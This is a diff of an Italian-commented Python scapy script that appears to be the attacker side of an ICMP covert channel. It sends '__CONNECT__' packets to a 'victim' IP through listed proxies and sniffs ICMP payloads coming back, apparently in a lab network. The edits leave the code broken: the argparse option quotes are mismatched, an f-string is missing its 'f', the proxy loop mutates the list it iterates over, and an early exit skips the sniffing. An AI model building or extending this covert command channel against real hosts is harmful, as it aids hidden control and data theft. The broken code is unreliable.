@@ -3,49 +3,20 @@
 from scapy.all import * #ICMP, IP, Raw, sniff
 import string
 import argparse
+import mymethods
 
 parser = argparse.ArgumentParser()
-parser.add_argument('--ip_vittima',type=str, help='IP della vittima')
-#parser.add_argument('--provaFlag',type=int, help='Comando da eseguire')
+parser.add_argument("--ip_vittima',type=str, help='IP della vittima")
+#parser.add_argument("--provaFlag',type=int, help='Comando da eseguire")
 
 proxyIP = [
     "192.168.56.101"
     ,"192.168.56.103"
+    #,"192.168.56.1"
     #,"192.168.56.xxx"
-]
-
-def printSupportedArguments():
-    print("Controlla di inserire due volte - per gli argomenti")
-    print("Argomenti supportati:")
-    print("\t--ip_vittima: IP della vittima")
-
-def check_args():
-    try:
-        args, unknown = parser.parse_known_args()
-        #args= parser.parse_args()
-        print("Argomenti passati: {}".format(args))
-        if len(unknown) > 0:
-            print("Argomenti sconosciuti: {}".format(unknown))
-            printSupportedArguments()
-            exit(1) 
-        return args
-    except Exception as e:
-        print("Errore: {}".format(e)) 
-        exit(1)
-
-def conn_To_Vittima(ip_vittima):
-    print(f"Connessione stabilita con {ip_vittima}")
-    pkt = IP(dst=ip_vittima)/ICMP() / "".join(
-        "__CONNECT__ "+proxyIP[index] if index==0 
-        else ", "+proxyIP[index] 
-        for index in range(len(proxyIP)
-    ))
-    ans = sr1(pkt, timeout=2, verbose=1)
-    if ans:
-        print(f"{ip_vittima} is alive")
-        #ans.show()
-    else:
-        print(f"No reply: {ip_vittima} is not responding") 
+] 
+ip_vittima=None
+sniffed_data=[]
 
 def sanitize(stringa):
     stringa = ''.join(
@@ -60,7 +31,7 @@ def analizza_pacchetto(packet):#ex packet_callback
         # Print the source and destination IP addresses
         #print(f"Source: {packet[IP].src}, Destination: {packet[IP].dst}")
         #print(f"Raw Payload: {packetData}".format(packetData=sanitize(packet[Raw].load.decode( 'utf-8',errors='ignore'))) ) 
-        id=packet[ICMP].id
+        id=packet[ICMP].id 
         seq=packet[ICMP].seq 
         return {
             "id":id, 
@@ -70,8 +41,6 @@ def analizza_pacchetto(packet):#ex packet_callback
         print("Packet does not contain ICMP or IP layers.")
         print(packet.summary()) #Print the packet summary
         #packet.show() #Print the packet details
-
-sniffed_data=[]
 
 def packet_callback(packet):
     if packet.haslayer(Raw) and packet.haslayer(IP) and packet.haslayer(ICMP):
@@ -157,14 +126,57 @@ sniff_args={
     "timeout": 60
 }
 
-if __name__ == "__main__":
+def conn_to_Vittima(ip_vittima):
+    print(f"Connessione stabilita con {ip_vittima}")
+    pkt = IP(dst=ip_vittima)/ICMP() / "".join(
+        "__CONNECT__ "+proxyIP[index] if index==0 
+        else ", "+proxyIP[index] 
+        for index in range(len(proxyIP)
+    ))
+    ans = sr1(pkt, timeout=2, verbose=1)
+    if ans:
+        print(f"{ip_vittima} is alive")
+        #ans.show()
+    else:
+        print(f"No reply: {ip_vittima} is not responding") 
+
+def conn_to_Proxy():
+    pass 
+
+def check_connection(ip):
+    if ip_vittima is None:
+        raise Exception("IP della vittima sconosciuto")
+    print(f"Connessione con {ip}...")
+    pkt = IP(dst=ip)/ICMP() / "".join( "__CONNECT__ {}".format(ip_vittima))
+    ans = sr1(pkt, timeout=2, verbose=1)
+    if ans:
+        print(f"{ip} is alive")
+        #ans.show()
+        return True
+    else:
+        print(f"{ip} is not responding NO REPLY") 
+        return False
+
+if __name__ == "__main__": 
     #1) l'attaccante si connettte prima con la vittima
-    args=check_args()
+    args=mymethods.check_args(parser)
     if args.ip_vittima is None:
         print("Devi specificare l'IP della vittima con --ip_vittima")
-        printSupportedArguments()
+        mymethods.supported_arguments()
+        exit(1) 
+    ip_vittima=args.ip_vittima
+    try: 
+        for proxy in proxyIP:
+            print(f"Prova IP proxy {proxy}")
+            proxyIP.remove(proxy) if not check_connection(proxy) else None 
+        if len(proxyIP)<1:
+            print("Nessun proxy presente. Prova a mettere questa macchina")
+            exit(1) 
+    except Exception as e:
+        print("Eccezzione: {e}") 
+    if not check_connection(ip_vittima): 
+        print("Impossibile connettersi con la vittima")
         exit(1)
-    conn_To_Vittima(args.ip_vittima)
     exit(0)
     #2) l'attaccante riceve i messaggi da determinati indirizzi
     print("Inizio Sniffing...") 
